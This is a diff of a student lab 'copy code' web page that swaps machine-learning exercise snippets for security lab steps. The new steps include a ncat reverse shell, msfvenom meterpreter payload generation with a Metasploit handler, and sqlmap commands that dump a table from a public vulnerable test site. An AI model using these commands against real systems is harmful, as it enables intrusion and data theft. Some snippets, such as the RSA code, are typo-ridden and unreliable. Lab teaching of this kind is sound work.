@@ -56,370 +56,88 @@
 
 <body>
 
-    <button onclick="copyText(text1)">prc1A Linear Regresssion</button>
-    <button onclick="copyText(text2)">prc1B Logistic Regression</button>
-    <button onclick="copyText(text3)">prc2A R programming</button>
-    <button onclick="copyText(text4)">prc2B k-Nearest Neighbor  </button>
-    <button onclick="copyText(text5)">prc3 Bayesian network </button>
-    <button onclick="copyText(text6)">prc4 K-Means Clustering</button>
-    <button onclick="copyText(text7)">prc5 Data Visualization python</button>
-    <button onclick="copyText(text8)">prc6 Pie Diagram, Bar Chart Diagram</button>
-    <button onclick="copyText(text9)">prc7 ETL process </button>
-    <button onclick="copyText(text10)">prc8 Data visualization libraries</button>
-     <button onclick="copyText(text11)">prc9 Decision Tree Classifier </button>
+    <button onclick="copyText(text1)">RSA</button>
+    <button onclick="copyText(text2)">IPconfig commands</button>
+    <button onclick="copyText(text3)">WireShark</button>
+    <button onclick="copyText(text4)">NCAT</button>
+    <button onclick="copyText(text5)">SQL Injection</button>
+    <button onclick="copyText(text6)">Putty SSH</button>
+    
     <p id="copiedMsg"></p>
     <script>
         var text1 = `
-import random
-from sklearn.linear_model import LinearRegression
-rows = 200
-limits = 2000
-featureSet = []
-targetSet = []
-
-for i in range(0,rows):
-    x = random.randint(0,limits)
-    y = random.randint(0,limits)
-    z = random.randint(0,limits)
-    g = ((10*x)+(2*y)+(3*z))
-    print(i+1,". ",x," ",y," ",z," = ",g)
-    print("==========================================")
-    featureSet.append([x,y,z])
-    targetSet.append(g)
-
-model = LinearRegression(
-model.fit(featureSet,targetSet)
-test_data = [[1,2,3]]
-prediction = model.predict(test_data)
-print("Prediction: ",prediction," Cofficient: ",model.coef_)
-
+from Crypto.PublibKey impoer RSA
+from Crypto import Random
+from Crypto.Cipher import PKCS1_v1_5
+random =random.new().read
+key=RSA.generate(4096,random)
+message=b'Your Message'
+cipher=PKCS1_v1_5.new(key)
+encrypted_message=cipher.encrypt(message)
+decrypted_message=cipher.decrypt(encrypted_message,None)
+print("Encrypted Message :",encrypted_message)
+print("Decrypted Message :",decrypted_message)
 `;
 
         var text2 = `
-import pandas as pd
-from sklearn.model_selection import train_test_split
-from sklearn.preprocessing import StandardScaler
-from sklearn.linear_model import LogisticRegression
-from sklearn.metrics import confusion_matrix,accuracy_score
-dataset = pd.read_csv("diabetes.csv")
-print(dataset.head())
-x = dataset.iloc[:,[0,1,2,3,4,5,6,7]].values
-y = dataset.iloc[:,[-1]].values.ravel()
-x_train, x_test, y_train, y_test = train_test_split(x, y, test_size=0.2, random_state=100)
-sc = StandardScaler()
-x_train = sc.fit_transform(x_train)
-x_test = sc.transform(x_test)
-print("************** x_train ***********")
-print(x_train[1])
-model = LogisticRegression()
-model.fit(x_train, y_train)
-y_pred = model.predict(x_test)
-cm = confusion_matrix(y_test, y_pred)
-print("Confusion Matrix :\n ", cm)
-print("Accuracy :", accuracy_score(y_test, y_pred) * 100)
+step 1:ipconfig
+step 2:ipconfig/all
+step 3:pconfig /displaydns
+step 4:ipconfig /flushdns
+step 5: wmic os get osarchitecture
 
 `;
         var text3 = `
-name <- "Your Name"
-rollNo <- "roll no "
-cat("Name: ",name,"\nRoll No: ",rollNo)
- 
-plot(1:10,type="l",col="green") 
-
-plot(1,4, col="red")
-plot(c(2,3),c(4,6) ,col="blue")
-
- 
-plot(c(1,3),c(5,10))
- 
-plot(1:10,type="l",col="green")
-
- 
-#Bar Charts
-x<-c("A","B","C")
-y<-c(2,4,6)
-barplot(y,main="Bar Chart",names.arg = x,col="blue") 
-
-#Scatter plots
-x<-c(5,7,8,7,2,2,9,4,11,12,9,6)
-y<-c(99,86,87,88,111,103,87,94,78,77,85,88)
-plot(x,y)
-plot(x,y,main="Scatter Plot",xlab="Car age",ylab="Car Speed")
- 
-line1<-c(1,2,3,4,5,10)
-line2<-c(2,5,7,8,9,10)
-plot(line1,main="Line plot",type="l",col="red")
-lines(line2,type="l",col="blue")
+Step 1:Start capturing in wireshark
+Step 2:Open this link  http://testphp.vulnweb.com/login.php
+Step 3:stop Capturing 
+Step 4: input "http" to display all packets related to the HTTP protocol.
+Step 5: http.request.method=="POST"
 `;
 
         var text4 = `
-import matplotlib.pyplot as plt
-from sklearn.neighbors import KNeighborsClassifier
-#Data Set
-x = [4, 5, 10, 4, 3, 11, 14 , 8, 10, 12]
-y = [21, 19, 24, 17, 16, 25, 24, 22, 21, 21]
-classes = [0, 0, 1, 0, 0, 1, 1, 0, 1, 1]
-#To plot data set
-plt.scatter(x, y, c=classes)
-plt.show()
- 
-#To merge x and y into single list
-data = list(zip(x, y))
-print(data)
-#model creation
-model = KNeighborsClassifier(n_neighbors=1)
-# Model is trained
-model.fit(data, classes)
+Part A Reverse Shell on windows
+Step 1:ufw disable
+Step 2:nc -lvp 4444
+Step 3:ncat -nv 192.168.100.144 4444 -e cmd.exe(execute on windows cmd prmt)
+Step 4:nc -lvp 4444
 
-new_x = 8
-new_y = 21
-new_point = [(new_x, new_y)]
-prediction = model.predict(new_point)
+Part B Reverse shell with payload
+Step 1:msfconsole
+Step 2:msfvenom
+Step 3:msfvenom -p/windows/meterpreter/reverse_tcp LHOST=192.168.100.144 LPORT=4444 -f exe>/home/desktop/shallcode/reverse_tcp.exe
+Step 4:python3 -m http.server
+Step 5:use exploite
+Step 6:use exploite/multi/handler
+Step 7:set payload windows/meterpreter/reverse_tcp
+Step 8:set lhost 192.168.100.144
+Step 9:set lport 4444
+Step 10:exploit
+Step 11:python3 -m http.server
+Step 12:ls
 
-plt.scatter(x + [new_x], y + [new_y], c=classes + [prediction[0]])
-plt.text(x=new_x-1.7, y=new_y-0.7, s=f"new point, class: {prediction[0]}")
-plt.show()
 `;
 
         var text5 = `
-import pandas as pd
-from pgmpy.estimators import MaximumLikelihoodEstimator
-from pgmpy.models import BayesianModel
-from pgmpy.inference import VariableElimination
-
-data = pd.read_csv("ds4.csv")
-heart_disease = pd.DataFrame(data)
-print(heart_disease)
-model = BayesianModel([
-    ('age', 'Lifestyle'),
-    ('Gender', 'Lifestyle'),
-    ('Family', 'heartdisease'),
-    ('diet', 'cholestrol'),
-    ('Lifestyle', 'diet'),
-    ('cholestrol', 'heartdisease'),
-    ('diet', 'cholestrol')
-])
- 
-model.fit(heart_disease, estimator=MaximumLikelihoodEstimator)
-
-HeartDisease_infer = VariableElimination(model)
-
-print('For Age enter SuperSeniorCitizen:0, SeniorCitizen:1, MiddleAged:2, Youth:3, Teen:4')
-print('For Gender enter Male:0, Female:1')
-print('For Family History enter Yes:1, No:0')
-print('For Diet enter High:0, Medium:1')
-print('for LifeStyle enter Athlete:0, Active:1, Moderate:2, Sedentary:3')
-print('for Cholesterol enter High:0, BorderLine:1, Normal:2')
- 
-q = HeartDisease_infer.query(variables=['heartdisease'], 
-    evidence={
-    'age': int(input('Enter Age: ')),
-    'Gender': int(input('Enter Gender: ')),
-    'Family': int(input('Enter Family History: ')),
-    'diet': int(input('Enter Diet: ')),
-    'Lifestyle': int(input('Enter Lifestyle: ')),
-    'cholestrol': int(input('Enter Cholestrol: '))
-})
-
-print(q)
-
+Step 1:sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 --dbs
+Step 2:sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart --tables
+Step 3:sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart -T artists --columns
+Step 4:sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart -T artists -C aname --dump
 `;
 
         var text6 = `
-import matplotlib.pyplot as plt
-from sklearn.cluster import KMeans
-
-x = [4, 5, 10, 4, 3, 11, 14 , 6, 10, 12]
-y = [21, 19, 24, 17, 16, 25, 24, 22, 21, 21]
-
-plt.scatter(x, y)
-plt.show()
-print("Ummara Ashrafi KFMSCIT040")
-data = list(zip(x, y))
-
-kmeans = KMeans(n_clusters=2)
-kmeans.fit(data)
-
-plt.scatter(x, y, c=kmeans.labels_)
-plt.show()
-`;
-
-        var text7 = `
-Code 1:
-import pandas as pd
-
-# reading the database
-data = pd.read_csv("tips.csv")
-
-display(data.head(10))
-
-Code 2:
-import pandas as pd
-import matplotlib.pyplot as plt
-
-data = pd.read_csv("tips.csv")
-
-plt.scatter(data['day'], data['tip'])
-plt.title("Scatter Plot  ")
-
-plt.xlabel('Day')
-plt.ylabel('Tip')
-plt.show()
-
-
-Code 3:
-import pandas as pd
-import matplotlib.pyplot as plt
-
-data = pd.read_csv("tips.csv")
-
-plt.scatter(data['day'], data['tip'], c=data['size'], s=data['total_bill'])
-
-plt.title("Scatter Plot  ")
-
-plt.xlabel('Day')
-plt.ylabel('Tip')
-plt.colorbar()
-plt.show()
-`;
-
-        var text8 = `
-Code 1: 
-import pandas as pd
-import matplotlib.pyplot as plt
-
-
-# reading the database
-data = pd.read_csv("tips.csv")
-
-# Bar chart with day against tip
-plt.bar(data['day'], data['tip'])
-
-# Setting the X and Y labels
-plt.xlabel('Day')
-plt.ylabel('Tip')
-
-# Adding the legends
-plt.show()
- 
-Code 2:
-import numpy as np
-import matplotlib.pyplot as plt
-y = np.array([35,25,25,15])
-
-plt.pie(y)
-plt.show()
-
-
-Code 3:
-import numpy as np
-import matplotlib.pyplot as plt
-y = np.array([35,25,25,15])
-mylabels = ["Finance", "Marketing","Sales","Logestic"]
-mycolors = ["black","hotpink","b","gray"]
-
-plt.pie(y, labels = mylabels, colors = mycolors)
-plt.show()
-`;
-
-        var text9 = `
-import requests
-from bs4 import BeautifulSoup
-def check_word_in_webpage(url, word):
-    response = requests.get(url)
-
-    if response.status_code == 200:
-
-        soup = BeautifulSoup(response.content, 'html.parser')
-        text_content = soup.get_text()
-
-        if word.lower() in text_content.lower():
-            print(f"The word '{word}' is present in the webpage.")
-        else:
-            print(f"The word '{word}' is not present in the webpage.")
-    else:
-        print("Failed to retrieve webpage.")
-
-url = input("Enter the url you want to Scrap :  ")
-word_to_check = input("Enter the text you want to know which is present or not :  ")
-check_word_in_webpage(url, word_to_check)
-
+Step 1: Service ssh start 
+Step 2:ufw status
+Step 3:open putty and enter ipaddress of ur kali 
+Step 4: Login by entering credential
+Step 5: sudo su (Escalate the user from normal user to root user)
+Step 6: cd SSH_Connection/
+Step 7: cat txtforssh.txt (enter some random text)
+Step 8: cat >>txtforssh.txt
+Stpe 9: cat txtforssh.txt
 
 `;
-       var text10 = `
-Code 1:
-#STEP -1 : Import Libraries
-import pandas as pd
-import matplotlib. pyplot as plt
-#Uploading Dataset
-data = pd.read_csv("Nifty.csv")
-print(data)
 
-#Plotting of x-axis & y-axis plot
-plt. plot(data['Open '],marker = "o",markeredgecolor="white", markerfacecolor="blue")
-plt. plot(data['Close '],marker = "o",markeredgecolor="white", markerfacecolor="orange")
-plt.grid()
-plt. title("Line Plot of NIFTY-50 by using Matplotlib")
-plt. xlabel('Open ')
-plt. ylabel('Close ')
-plt.legend(['Open', 'Close'])
-plt. show()
-
-Code 2:
-#DATA VISUALIZATION USING SEABORN
-import pandas as pd
-import seaborn as sns
-import matplotlib.pyplot as plt
-# Load dataset
-data = pd.read_csv("Nifty.csv")
-# Plotting
-plt.figure(figsize=(10, 6))
-sns.lineplot(data=data[['Open ', 'Close ']], markers=True, marker='o', markeredgecolor="white", palette=['green', 'red'])
-plt.title("Line Plot of NIFTY-50 by using Seaborn")
-plt.xlabel('Index')
-plt.ylabel('Price')
-plt.grid(True)
-plt.show()
-
-Code 3:
-#DATA VISUALIZATION USING PLOTLY
-import pandas as pd
-import plotly.express as px
-# Load dataset
-data = pd.read_csv("Nifty.csv")
-# Plotting
-fig = px.line(data, x=data.index, y=['Open ', 'Close '], markers=True,
-              title="Line Plot of NIFTY-50 using Plotly", labels={'index': 'Index', 'value': 'Price'},
-              color_discrete_sequence=['green', 'red'])
-
-fig.update_layout(legend_title='Price', legend=dict(x=0, y=1, traceorder='normal'),
-                  plot_bgcolor='rgba(0,0,0,0)')
-fig.show()
-
-
-`;
-                var text11 = `
-import pandas as pd
-import matplotlib.pyplot as plt
-from sklearn.tree import DecisionTreeClassifier, plot_tree
-from sklearn.model_selection import train_test_split
-from sklearn.metrics import accuracy_score
-print("Ummara Ashrafi KFMSCIT040")
-data = pd.read_csv('iris.csv')
-print(data.head())
-X = data.drop('species', axis=1)
-y = data['species']
-X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.2, random_state=42)
-model = DecisionTreeClassifier()
-model.fit(X_train, y_train)
-y_pred = model.predict(X_test)
-accuracy = accuracy_score(y_test, y_pred)
-print(f"Accuracy: {accuracy:.2f}")
-plt.figure(figsize=(12, 8))
-plot_tree(model, filled=True, feature_names=X.columns.tolist(), class_names=y.unique().tolist())
-plt.title("Decision Tree Visualization")
-plt.show()
-`;
         function copyText(text) {
             navigator.clipboard.writeText(text).then(function () {
                 document.getElementById('copiedMsg').innerHTML = "Text Copied"
